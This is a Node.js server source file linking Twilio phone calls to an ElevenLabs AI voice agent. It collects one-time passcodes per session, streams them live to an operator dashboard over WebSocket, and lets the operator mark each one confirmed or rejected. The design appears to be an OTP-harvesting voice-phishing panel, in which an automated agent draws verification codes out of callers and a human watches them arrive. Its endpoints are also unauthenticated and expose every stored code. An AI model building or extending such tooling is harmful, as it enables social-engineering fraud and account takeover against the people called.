const express = require('express');
const cors = require('cors');
const { WebSocketServer, WebSocket } = require('ws');
const http = require('http');
const twilio = require('twilio');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: false })); // needed for Twilio webhooks
app.use(express.static('public'));

// ─── CONFIG ───────────────────────────────────────────────────────────────────
const TRANSFER_NUMBER = "+447xxxxxxxxx";       // 👈 Your number to transfer to
const ELEVENLABS_AGENT_ID = "your_agent_id";  // 👈 Your ElevenLabs Agent ID
// ──────────────────────────────────────────────────────────────────────────────

const VoiceResponse = twilio.twiml.VoiceResponse;
const pending = {};
const conversations = {};

function broadcast(event, data) {
  const msg = JSON.stringify({ event, data });
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(msg);
  });
}

// ─── EXISTING ROUTES ──────────────────────────────────────────────────────────

app.post('/submit-otp', (req, res) => {
  const { session_id, otp } = req.body;
  if (!session_id || !otp) return res.status(400).json({ error: 'Missing fields' });
  pending[session_id] = { otp, status: 'pending', timestamp: Date.now() };
  if (!conversations[session_id]) conversations[session_id] = [];
  broadcast('otp_received', { session_id, otp, status: 'pending' });
  res.json({ success: true });
});

app.get('/pending', (req, res) => {
  res.json(pending);
});

app.post('/decide', (req, res) => {
  const { session_id, decision } = req.body;
  if (!pending[session_id]) return res.status(404).json({ error: 'Not found' });
  pending[session_id].status = decision;
  broadcast('otp_decision', { session_id, status: decision });
  res.json({ success: true });
});

app.get('/status/:session_id', (req, res) => {
  const entry = pending[req.params.session_id];
  if (!entry) return res.json({ status: 'not_found' });
  res.json({ status: entry.status, otp: entry.otp });
});

app.post('/transcript', (req, res) => {
  const { session_id, role, message, conversation_id } = req.body;
  if (!session_id || !message) return res.status(400).json({ error: 'Missing fields' });
  if (!conversations[session_id]) conversations[session_id] = [];
  const entry = { role: role || 'unknown', message, conversation_id, timestamp: Date.now() };
  conversations[session_id].push(entry);
  broadcast('transcript_message', { session_id, ...entry });
  if (role === 'user' && /^\d+$/.test(message.trim())) {
    if (message.trim() === '1' && pending[session_id]) {
      pending[session_id].status = 'confirmed';
      broadcast('otp_decision', { session_id, status: 'confirmed' });
    } else if (message.trim() === '2' && pending[session_id]) {
      pending[session_id].status = 'rejected';
      broadcast('otp_decision', { session_id, status: 'rejected' });
    }
  }
  res.json({ success: true });
});

app.get('/transcript/:session_id', (req, res) => {
  res.json(conversations[req.params.session_id] || []);
});

// ─── NEW: TWILIO DTMF CALL TRANSFER ──────────────────────────────────────────

/**
 * POST /incoming-call
 * Set this as your Twilio phone number webhook.
 * Starts ElevenLabs agent and listens for keypad presses at the same time.
 */
app.post('/incoming-call', (req, res) => {
  const twiml = new VoiceResponse();

  const gather = twiml.gather({
    numDigits: 1,
    action: '/handle-keypress',
    method: 'POST',
    timeout: 0,               // keep listening for the entire call duration
    actionOnEmptyResult: false,
  });

  // ElevenLabs agent runs inside the gather block
  const connect = gather.connect();
  connect.conversationalAi({
    agentId: ELEVENLABS_AGENT_ID,
  });

  res.type('text/xml');
  res.send(twiml.toString());
});

/**
 * POST /handle-keypress
 * Twilio calls this when the caller presses a key.
 * Press 1 → transfer to your number.
 * Any other key → resume ElevenLabs agent.
 */
app.post('/handle-keypress', (req, res) => {
  const digit = req.body.Digits;
  const callSid = req.body.CallSid;
  const twiml = new VoiceResponse();

  if (digit === '1') {
    console.log(`📞 [${callSid}] Caller pressed 1 — transferring to ${TRANSFER_NUMBER}`);
    twiml.say({ voice: 'Polly.Amy' }, 'Please hold while I transfer your call.');
    twiml.dial(TRANSFER_NUMBER);
  } else {
    // Resume the ElevenLabs agent for any other key
    console.log(`🔢 [${callSid}] Caller pressed ${digit} — resuming agent`);
    const gather = twiml.gather({
      numDigits: 1,
      action: '/handle-keypress',
      method: 'POST',
      timeout: 0,
      actionOnEmptyResult: false,
    });
    const connect = gather.connect();
    connect.conversationalAi({
      agentId: ELEVENLABS_AGENT_ID,
    });
  }

  res.type('text/xml');
  res.send(twiml.toString());
});

// ─── WEBSOCKET ────────────────────────────────────────────────────────────────

wss.on('connection', (ws) => {
  ws.send(JSON.stringify({ event: 'init', data: { pending, conversations } }));
});

// ─── START ────────────────────────────────────────────────────────────────────

server.listen(3000, () => {
  console.log('✅ Server running on port 3000');
  console.log(`📞 Transfer number: ${TRANSFER_NUMBER}`);
  console.log(`🤖 ElevenLabs Agent: ${ELEVENLABS_AGENT_ID}`);
});
